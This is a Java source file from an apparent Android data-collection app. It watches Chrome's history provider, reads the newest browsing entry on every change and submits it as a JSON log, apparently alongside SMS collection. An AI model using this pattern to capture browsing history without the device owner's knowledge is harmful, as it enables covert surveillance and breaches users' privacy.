package the5concurrentnodes.mmaData.Browser;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import the5concurrentnodes.mmaData.sms.Sms;
import the5concurrentnodes.mmaData.sms.SmsConstants;

public class BrowserObserver extends ContentObserver {
    private Context context;
    private BrowserHandler browserHandler;

    public BrowserObserver (Context context)
    {
        super(null);
        this.context = context;
        this.browserHandler= new BrowserHandler();
    }
    @Override
    public void onChange(boolean selfChange) {
        onChange(selfChange, null);
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange);

        Cursor chromeCursor = context.getContentResolver().query(Uri.parse(BrowserConstants.CHROME_CONTENT_URI)
                , null, null, null, "_id DESC");

        if(chromeCursor != null) {

            chromeCursor.moveToFirst();
            Browser browser = browserHandler.getBrowserInformation(chromeCursor);

            browser.setType("Chrome");

            browserHandler.submitLog(context, browser.toJSONObject());
            if(!chromeCursor.isClosed())
                chromeCursor.close();
        }

    }

    @Override
    public boolean deliverSelfNotifications(){ return  false;}
}

